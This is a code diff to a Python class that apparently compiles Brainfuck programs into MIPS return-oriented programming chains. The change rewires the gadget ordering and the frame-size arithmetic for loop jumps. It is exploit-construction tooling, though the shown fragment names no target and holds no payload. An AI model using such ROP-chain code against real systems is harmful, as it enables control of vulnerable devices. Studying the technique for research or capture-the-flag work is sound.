@@ -79,10 +79,11 @@ class BF_Parser():
                    self.__and_a3_s0.get_frame_size()
 
         elif instruction == '[' or instruction == ']':
-            return self.__charger.get_frame_size() + \
-                   self.__copy_a3.get_frame_size() + \
+            return self.__pop_s0.get_frame_size() + \
                    self.__move_sp.get_frame_size() + \
+                   self.__copy_a3.get_frame_size() + \
                    self.__mov_a4_a3.get_frame_size() + \
+                   self.__charger.get_frame_size() + \
                    self.__mov_a0_a4.get_frame_size() + \
                    self.__beqz_s0.get_frame_size()
 
@@ -231,24 +232,30 @@ class BF_Parser():
 
     def __parse_jump(self, sp, zero_sp, nonzero_sp):
         backup_addr = sp + \
-                      self.__charger.get_frame_size() + \
-                      self.__copy_a3.get_frame_size() + \
+                      self.__pop_s0.get_frame_size() + \
                       self.__move_sp.get_frame_size() + \
+                      self.__copy_a3.get_frame_size() + \
                       self.__mov_a4_a3.get_frame_size() + \
+                      self.__charger.get_frame_size() + \
                       0x18 # offset for s3
-        
-        rop_chain = self.__charger.construct_frame(ra=self.__copy_a3.get_vaddr(), \
+
+        rop_chain = self.__pop_s0.construct_frame(ra=self.__move_sp.get_vaddr(),
+                                                   s0=sp + self.__pop_s0.get_frame_size() + 0x50 \
+                                                   )
+
+        rop_chain += self.__move_sp.construct_frame(ra=self.__copy_a3.get_vaddr(), \
                                                     s0=backup_addr, \
-                                                    s4=self.__beqz_s0.get_vaddr()
+                                                    s1=-0x24, \
+                                                    s4=self.__mov_a4_a3.get_vaddr() \
                                                     )
         
-        rop_chain += self.__copy_a3.construct_frame(ra=self.__move_sp.get_vaddr(), \
-                                                    s0=sp + self.__charger.get_frame_size() + self.__copy_a3.get_frame_size() + 0x50 \
+        rop_chain += self.__copy_a3.construct_frame(ra=self.__inc_a3.get_vaddr())
+
+        rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__charger.get_vaddr())
+
+        rop_chain += self.__charger.construct_frame(ra=self.__mov_a0_a4.get_vaddr(), \
+                                                    s4=self.__beqz_s0.get_vaddr() \
                                                     )
-
-        rop_chain += self.__move_sp.construct_frame(ra=self.__mov_a4_a3.get_vaddr())
-
-        rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__mov_a0_a4.get_vaddr())
 
         rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__load_s0.get_vaddr(), \
                                                       s2=self.__pop_s0.get_vaddr(), \
